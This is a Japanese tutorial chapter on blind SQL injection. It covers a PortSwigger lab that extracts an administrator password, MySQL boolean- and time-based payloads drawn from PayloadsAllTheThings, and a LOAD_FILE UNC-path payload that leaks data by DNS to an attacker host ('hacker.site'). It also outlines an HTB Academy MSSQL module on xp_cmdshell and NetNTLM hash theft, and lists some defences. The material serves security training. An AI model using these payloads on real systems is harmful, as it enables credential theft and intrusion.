1. まず`users`テーブルの存在を確認する条件式（テーブルが存在すれば`SELECT`がエラーにならないことを利用、あるいは逆に存在確認用のサブクエリで例外を起こす）などで、対象スキーマの基本情報を探る。
2. `administrator`のようなユーザー名が実在するかを条件に組み込む。

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
       FROM users WHERE username='administrator')||'
```

3. パスワード長を二分探索的に確定する。`LENGTH(password)>X`のXを変えながら送信し、エラーが出る／出ないの境界を探して正確な文字数（ラボでは20文字）を特定する。

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
       FROM users WHERE username='administrator' AND LENGTH(password)>5)||'
```

4. 各桁の文字をBurp Intruderで総当たりする。`SUBSTR(password,1,N)='候補文字'`のNを1から20まで動かし、候補文字（英数字）をIntruderのペイロードリストとして与え、エラー（500）が返ったリクエストの候補文字が正解の桁の文字だと判定する。

```sql
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END
       FROM users WHERE username='administrator'
       AND SUBSTR(password,1,1)='a')||'
```

Burp Intruderの「Grep - Match」や「Status code」フィルタを使い、HTTP 500が返った行だけを抽出すれば、真になった桁と候補文字の組み合わせを機械的に洗い出せる。これを1文字目から20文字目まで、26種のアルファベット＋10種の数字（必要なら記号も）を総当たりで繰り返し、パスワード全体を復元する。

### この手法がboolean-basedと本質的に同じでありながら実務上重要な理由

conditional errorsは分類上はboolean-based blindの一種だが、**アプリケーションがSELECT結果を全く表示しない場合でも使える**という点で価値が高い。多くの実アプリケーションは「検索結果0件」と「エラー」を区別してレスポンスを返す設計になっており、たとえレスポンスボディの差分でブール判定ができなくても、エラーページの有無・HTTPステータスコードという別の軸でブール判定ができる余地が残っていることが多い。したがって実務のトリアージでは、①レスポンス内容の差分（boolean-based）、②エラー有無/ステータスコード差分（conditional errors）、③応答時間差（time-based）、④外部通信（OOB）の順に、使えるチャネルを機械的に総当たりして確認するのが効率的である。

### 対策（conditional errorsに対する防御）

- **プレースホルダを用いたパラメータ化クエリ**。これが最も根本的な対策であり、本節で示したいずれの手法も、そもそも文字列連結によるSQL構文侵入が発生しなければ成立しない。
- 本番環境では**詳細なDBエラーメッセージをクライアントに返さない**。汎用的な「Internal Server Error」に統一し、スタックトレースやORAコードを露出させない。
- できる限り**すべてのエラーレスポンスを同一のステータスコード・同一のレスポンス形状**に正規化する（成功時と失敗時でレスポンスサイズ・タイミング・ステータスが可能な限り均一になるよう設計する）ことで、たとえ1ビットのシグナルであっても外部から観測しにくくする。
- WAFによる典型的なエラー誘発パターン（`1/0`、`CAST`失敗を狙う型不一致、`CASE WHEN`の異常な使用パターンなど）の検知。ただし根本対策ではなく多層防御の一部と位置づける。

> ⚠️ **補足**: 上記2件のPortSwiggerラボページは、いずれもインタラクティブな演習環境（実際に攻略操作を行うラボ）であり、自動取得したページ内容にはUIの手順説明を中心とした簡潔な記述が含まれる。本節の「仕組みレベルの解説」（XXEの動作原理、CASE式の型解決、Oracleのdual表など）は、取得した記事内容を踏まえた上で、筆者の専門知識により技術的背景を補って記述したものである。

## Blindペイロードと難所モジュール

前節までで、レスポンス本文にDBの出力が直接現れる状況（UNIONベース・エラーベース）を扱った。しかし実務で遭遇するSQLiの多くは、アプリケーションが「正常」「エラー」あるいは「何も返さない」という数種類の状態しか見せてくれない**ブラインドSQLi（Blind SQLi）**である。この節では、MySQLに対する具体的なboolean-based / time-basedペイロードの実物を PayloadsAllTheThings（以下PATT）から抽出し、その裏側で何が起きているかをパーサ・関数実装のレベルで解説する。続けて、より難易度の高いMSSQL特化のHTB Academy「Blind SQL Injection」モジュールがどのような技法体系（OOB/DNS、RCE、NetNTLMハッシュ窃取まで）をカバーしているかを、モジュール構成に沿って紹介する。読者はboolean-basedの基礎自体は既知の中〜上級者を想定するため、用語の初出解説は最小限にとどめ、「なぜその関数・その構文でデータが1ビットずつ漏れるのか」という内部動作の説明に重点を置く。

### Blind SQLiの分類とオラクル設計という考え方

ブラインドSQLiは、攻撃者が観測できる情報の種類によって大きく2つに分かれる。

- **Boolean-based blind**: 注入した条件式の真偽によって、レスポンスの内容（文言、HTTPステータス、返却件数、ページの構造など）が変化する場合に使う。攻撃者は「真のときに現れる差分」と「偽のときに現れる差分」を1つ見つければ、それを1ビットの判定装置（オラクル）として使い、任意のブール条件をこの装置に通すことでデータを1文字ずつ、あるいは1ビットずつ復元できる。
- **Time-based blind**: レスポンスの内容に一切差分がない（真偽で見た目が完全に同じ）場合に使う。注入した条件式が真のときだけDBに意図的な遅延を発生させる関数を実行させ、レスポンスタイムの差（例: 通常0.2秒 vs 条件成立時10秒）を観測してオラクルとする。

どちらの手法も、本質は「二値の答えしか返らない質問器（オラクル）をどう設計するか」に尽きる。この「オラクル設計（Designing the Oracle）」という言い方自体、後述のHTB Academyモジュールのセクション名に明示的に登場する考え方であり、blind SQLiを体系的に学ぶ上での核心概念である。

### PayloadsAllTheThings: MySQL向けboolean-basedペイロード

PATTのMySQL Injectionページは、boolean-basedブラインドを成立させるための代表的な文字列比較・抽出関数と、実際のペイロード例を列挙している。

#### 文字抽出関数

`SUBSTR()` / `SUBSTRING()` / `MID()` / `LEFT()` / `RIGHT()` はいずれも文字列の一部を切り出す関数であり、「対象文字列の n 文字目が何であるか」を1文字ずつ総当たりで確定させていく際の基本部品になる。`ASCII()` は文字を数値（コードポイント）に変換する関数で、文字同士の等価比較ではなく数値の大小比較（`>`, `<`, `>=` など）を使うことで、二分探索によって照合回数を大幅に減らせる点が重要である。単純な「1文字ずつ全パターンを試す」総当たりでは印字可能文字だけでも数十〜百回の問い合わせが必要になるが、`ASCII(...)` を数値として二分探索すれば、1文字あたりの問い合わせ回数を log2(文字コード範囲) 程度（例えば0〜255の範囲なら最大8回）まで圧縮できる。これがboolean-based blindの効率化における最重要テクニックである。

```sql
2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
```

> 出典: PayloadsAllTheThings MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

このペイロードは `IF()` 関数（第1引数の条件が真なら第2引数、偽なら第3引数を返す、MySQL独自の3引数関数）と `MID()` を組み合わせている。`@@version` はMySQLのシステム変数で、稼働中のサーバーバージョン文字列を保持している。`MID(@@version,1,1)` でバージョン文字列の先頭1文字を切り出し、それが `'5'` かどうかを判定材料にすることで、「MySQL 5系かどうか」という1ビットの情報をブール差分（または後述のsleep遅延）に変換している。

```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

`information_schema.tables` はMySQLが自動的に維持しているメタデータビューであり、そのDB内に存在するすべてのテーブル名を保持している。ここから `table_name` を1文字ずつ抽出し、辞書順比較（`>`）や `ASCII()` による数値比較で絞り込んでいくことで、テーブル一覧を直接見ることができない状況でもテーブル名を丸ごと復元できる。`ASCII(LOWER(SUBSTR(version(),1,1)))=51` の `51` はASCIIコード `51 = '3'` に対応しており、バージョン番号の先頭桁が `3` かどうかを問うている（`LOWER()` は大文字小文字の揺れを吸収するための前処理）。

#### MAKE_SETを使った比較

```sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
```

`MAKE_SET(bits, str1, str2, ...)` は本来、ビットマスクに応じて文字列を連結して返すMySQL関数だが、ここでは変則的な使い方として、第1引数に比較式（真偽値、MySQLでは真=1・偽=0として扱われる）を渡すことで、条件式の真偽をそのままクエリの一部として評価させるトリックに使われている。WAFやフィルタが `IF(` や典型的な boolean-based のシグネチャ（`AND 1=1` など）だけを検知対象にしている場合、`MAKE_SET` のような「本来別用途の関数を条件評価器に転用する」パターンは検知網をすり抜けやすい。これは、WAFのシグネチャ検知が「構文パターンのブラックリスト」に依存する限り原理的に迂回され得る、という一般則の具体例でもある。

#### LIKE / REGEXPによるパターンマッチ

```sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
' OR (SELECT username FROM users WHERE username REGEXP '^.{8,}$') --
' OR (SELECT username FROM users WHERE username REGEXP '[0-9]') --
' OR (SELECT username FROM users WHERE username REGEXP '^a[a-z]') --
```

`LIKE` はワイルドカード（`%` = 任意長の任意文字列、`_` = 任意の1文字）によるパターン一致演算子であり、`REGEXP` はPOSIX正規表現によるマッチングを行う演算子である。`^.{8,}$` は「8文字以上」という長さ制約、`[0-9]` は「数字を含むかどうか」、`^a[a-z]` は「先頭が `a` で2文字目が小文字アルファベット」という条件をそれぞれ表す。これらは単一の等価比較よりも表現力が高く、1回の問い合わせで得られる情報量（真になる確率の絞り込み幅）を調整しやすいという利点がある。ただし正規表現エンジンの実装（MySQLはバージョンによってPOSIX正規表現ライブラリまたはICU正規表現エンジンを使用しており、5.7以前と8.0以降で構文互換性に差異がある）に依存するため、対象バージョンの確認が必要になる点は明記しておく。

### time-basedブラインド: なぜ「遅延」で1ビットが伝わるのか

boolean差分がレスポンス本文やステータスコードにまったく現れない場合（例えばアプリが常に同じ「エラー」ページしか返さない、あるいはレスポンスが完全に同一で差分検知の余地がない場合）、攻撃者は代わりに**処理時間**という、DBがブール条件の真偽を評価するために必ず消費する副作用を観測する。

#### BENCHMARK()（MySQL 4/5系で広く使われた古典手法）

```sql
+BENCHMARK(40000000,SHA1(1337))+
AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
```

`BENCHMARK(count, expr)` は本来、指定した式 `expr` を `count` 回繰り返し実行し、その所要時間を計測するためのベンチマーク用関数である。`count` に非常に大きな数値（例では4000万回）を渡すことで、`SHA1()` や `MD5()` のようなCPU負荷の高いハッシュ計算を大量に繰り返させ、意図的に処理時間を引き延ばしている。この手法は「遅延させたい秒数」を直接指定できないという欠点があり（実行環境のCPU性能によって同じ `count` でも所要時間が変動する）、後述の `SLEEP()` に比べて再現性・移植性に劣る。この不安定さのため、現在の実務ではBENCHMARKよりSLEEPが優先して使われる傾向にあるが、SLEEP関数がなんらかの理由で無効化・フィルタされている環境では依然として有効な代替手段になり得る。

#### SLEEP()（MySQL 5以降で標準的な手法）

```sql
RLIKE SLEEP([SLEEPTIME])
OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))
XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR
AND SLEEP(10)=0
```

`SLEEP(n)` はMySQL 5.0.12以降で実装された関数で、呼び出されると接続スレッドを `n` 秒間確実にブロックしてから `0` を返す。`BENCHMARK` と違い、CPU性能に依存せず常に一定秒数だけ遅延させられる点が最大の利点である。`XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR` は一見奇妙な構文に見えるが、これは既存クエリの構文構造を壊さずに条件式を挟み込むための「接続子トリック」であり、`NOW()=SYSDATE()` という常に真になる（クエリキャッシュを無効化するためにあえて実時刻関数を比較している、という説もある）判定式を土台にしている点が特徴である。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
```

`FROM DUAL` はMySQLにおいて「実テーブルを参照しない、値を評価するためだけのダミーテーブル」を表す構文糖衣である。`SELECT SLEEP(10) FROM DUAL WHERE <条件>` という形にすると、`WHERE` 句の条件が真のときだけ `SELECT` 文が評価され、その評価過程で `SLEEP(10)` が実行される。`DATABASE() LIKE '%'` から `LIKE '___'`（アンダースコア3個 = 3文字）、さらに `LIKE 'A____'`（先頭が `A` で計5文字）と条件を絞り込んでいく過程は、まず「DB名の長さ」を確定させ、次に「先頭文字」を確定させるという、blind SQLiにおける定番の2段階抽出戦略（長さ→内容の順で総当たり空間を狭める）を体現している。

```sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
```

このペイロードはさらに一歩進んで、サブクエリで `information_schema.columns` から「カラム名に `pass` を含むテーブル」を1件（`LIMIT 0,1`）取得し、それを外側の `LIKE` 条件の対象にしている。パスワードらしきカラムを持つテーブルを機械的に発見するための、実戦的なテンプレートである。

```sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
```

`IF(条件, 1, BENCHMARK(...))` という構造は、「条件が真なら軽い値 `1` を返して即座に終わる／条件が偽なら重い `BENCHMARK` を実行して意図的に遅らせる」という、boolean-basedとtime-basedのハイブリッドである。`ASCII(SUBSTRING((SELECT USER()),1,1))>=100` は「現在の接続ユーザー名の1文字目のASCIIコードが100以上か」という二分探索の一手にあたり、この形式を繰り返すことでユーザー名文字列全体を復元できる。

### OOB（Out-of-Band）/ DNSエクスフィルトレーション

boolean-basedもtime-basedも「HTTPレスポンスを1回ずつ観測する」必要があり、データ量が多いと問い合わせ回数（＝往復回数）が膨大になる。OOBはこの制約を迂回し、DBサーバー自身に**別のプロトコル経由**（典型的にはDNSクエリ）でデータを外部に送信させる手法である。

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
```

`LOAD_FILE()` は本来ローカルファイルを読み込むMySQL関数だが、引数にUNC形式のパス（`\\ホスト名\共有名\ファイル名` というWindows SMB共有のパス表記）を渡すと、Windows上で稼働するMySQLサーバーはこのホスト名を名前解決しようとする。`CONCAT('\\\\', VERSION(), '.hacker.site\\a.txt')` は、DBのバージョン文字列を**DNSクエリの中に埋め込む**ためのテクニックであり、生成されるホスト名はおおよそ `<VERSION()の値>.hacker.site` の形になる。攻撃者が `hacker.site` の権威DNSサーバーを制御していれば、このドメインへの名前解決クエリをサーバー側でログとして観測でき、HTTPレスポンスを一切介さずにDBの内部情報（この例ではバージョン文字列だが、原理的にはサブクエリの結果を任意にこの位置へ差し込める）を受け取れる。これがOOB/DNSエクスフィルトレーションの核心であり、HTTPレイヤーでの検知・遅延計測（time-based）を回避しつつ、実質的に無制限の情報量を1回のクエリで抜き出せる強力な手法である。ただし、対象サーバーがインターネット向けDNS解決を行えない（社内ネットワーク隔離・アウトバウンドDNSがフィルタされているなど）環境では機能しない点に留意する必要がある。

> 出典: PayloadsAllTheThings MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

### HTB Academy「Blind SQL Injection」モジュール（MSSQL特化・Hard難度）

> ⚠️ **未取得の資料**: HTB Academyの「Blind SQL Injection」モジュール本文（各セクションの講義本文・演習）はログイン・購読が必要なコンテンツであり、自動取得の対象はモジュール概要（プレビュー）ページに限られました。理由: 本文コンテンツが認証必須（サブスクリプション）で、未認証のWebFetchではプレビュー情報（タイトル、難度、前提知識、セクション一覧、要約）のみが取得可能でした。詳細な講義本文・演習環境・スクリプト例をご覧になりたい場合は、以下のURLからご自身でログインの上直接ご覧ください: https://academy.hackthebox.com/course/preview/blind-sql-injection

（以下は未取得資料の補足として、取得できたプレビュー情報と一般知識に基づく解説です）

このモジュールは、Microsoft SQL Server（MSSQL）を対象としたBlind SQLiに特化した、難度「Hard」のコースである。前提として「SQL Injection Fundamentals」モジュールと「Introduction to Python3」モジュールの修了、およびWebアプリケーションの中級程度の理解が要求されており、単発のペイロード暗記ではなく、抽出処理を自動化するPythonスクリプトの自作までを到達目標に据えている点が、本節前半のPATTペイロード集との大きな違いである。

公開されている全16セクションの構成は次の通りである。

1. Introduction to MSSQL/SQL Server（MSSQL/SQL Serverの基礎）
2. Introduction to Blind SQL Injection（ブラインドSQLiの導入）
3. Identifying Boolean-based SQLi（boolean-basedの識別）
4. Designing the Oracle（オラクルの設計）
5. Extracting Data（データ抽出）
6. Optimizing（最適化）
7. Identifying Time-based SQLi（time-basedの識別）
8. Oracle Design（time-basedにおけるオラクル設計）
9. Data Extraction（time-basedでのデータ抽出）
10. Out-of-Band DNS（OOB/DNSエクスフィルトレーション）
11. Remote Code Execution（リモートコード実行）
12. Leaking NetNTLM Hashes（NetNTLMハッシュの窃取）
13. File Read（ファイル読み取り）
14. Tools of the Trade（実務で使われるツール）
15. Defending against SQL Injection（防御）
16. Skills Assessment（実技評価）

セクション構成から読み取れる本モジュールの設計思想は、boolean-basedとtime-basedそれぞれについて「識別（Identifying）→オラクル設計（Designing the Oracle）→データ抽出（Extracting Data）→最適化（Optimizing）」という同一の4段階フレームワークを繰り返し適用している点にある。これは本節冒頭で述べた「オラクル設計」という考え方が、単なる比喩ではなくHTB Academyが教育カリキュラムとして明示的に採用している方法論であることを裏付けている。

MySQL中心のPATTペイロード集と比較したとき、本モジュールがMSSQL特有の到達点としてカバーしている技法は次の3つである。

- **Out-of-Band DNS（セクション10）**: MySQLの `LOAD_FILE()` + UNCパスに相当する技法として、MSSQLでは拡張ストアドプロシージャ `xp_dirtree` や `xp_fileexist` にUNCパスを渡すことでSMB名前解決（したがってDNSクエリ）を発生させる手法が知られている。原理はMySQLの場合と同様で、DBサーバーにホスト名解決という「副チャネル」を踏ませ、攻撃者が制御するDNSサーバーでクエリを観測することでデータを抜き出す。
- **Remote Code Execution（セクション11）**: MSSQLには `xp_cmdshell` という拡張ストアドプロシージャがあり（既定では無効化されているが、`sp_configure` で有効化する権限を持つコンテキストからSQLi経由で有効化・実行されるケースがある）、これが有効化されるとOSコマンドを任意実行できる。SQLiがDB内部の情報漏えいにとどまらず、ホスト侵害にまで直結し得ることを最も直接的に示す到達点である。
- **Leaking NetNTLM Hashes（セクション12）**: 前述のUNCパス経由アクセス（`xp_dirtree` など）を悪用すると、MSSQLサーバーは攻撃者が用意したSMB共有に対して認証を試みる際、サーバーが動作しているWindowsマシンのサービスアカウントのNetNTLMハッシュ（チャレンジ・レスポンス形式の認証情報）を意図せず送出してしまう。攻撃者はこれを（Responderのようなツールで）捕捉し、オフラインクラッキングやNTLMリレー攻撃に転用できる。OOBチャネルが単なる「データ抜き出し経路」にとどまらず、「認証情報そのものを漏らす経路」にもなり得るという点は、MySQL環境のOOB/DNS技法にはない、MSSQL特有の重大な波及効果である。

> 出典: HTB Academy Blind SQL Injection（MSSQL）モジュール概要 — https://academy.hackthebox.com/course/preview/blind-sql-injection

### 両資料を通じた実務上の示唆

PATT（MySQL）とHTB Academy（MSSQL）を並べて読むと、DBMSが変わってもBlind SQLiの原理的骨格（真偽差分の観測、遅延関数によるビット伝送、OOBによる帯域外チャネルの確保）は共通している一方、それを実現する具体的な関数・構文（MySQLの `SLEEP()`/`BENCHMARK()`/`LOAD_FILE()` vs MSSQLの `WAITFOR DELAY`/`xp_dirtree`/`xp_cmdshell`）はDBMSごとの実装に強く依存することが分かる。攻撃側・防御側いずれの立場でも、「対象DBMSが何か」を最初に確定させる作業（バナー情報、エラーメッセージの方言、`@@version` や `SERVERPROPERTY('ProductVersion')` のようなDBMS固有関数への応答差）が、Blind SQLiの攻略ルート選定における最初の分岐点になる。また、time-basedやOOBは通信の往復回数やDNSインフラの準備コストが高く、boolean-basedより検知・調査コストが高い代わりに、レスポンス差分が一切ない厳しい環境でも機能する「最後の砦」的な位置づけにある、という技法間の優先順位づけも、両資料を通じて読み取れる重要な実務知見である。

---

[← 第2章 中核の悪用：in-band（UNION・エラーベース）](02-in-band.md) ｜ [📖 目次](index.md) ｜ [第4章 DB別技法（MySQL・PostgreSQL・MSSQL・Oracle・SQLite） →](04-dbms-specific.md)
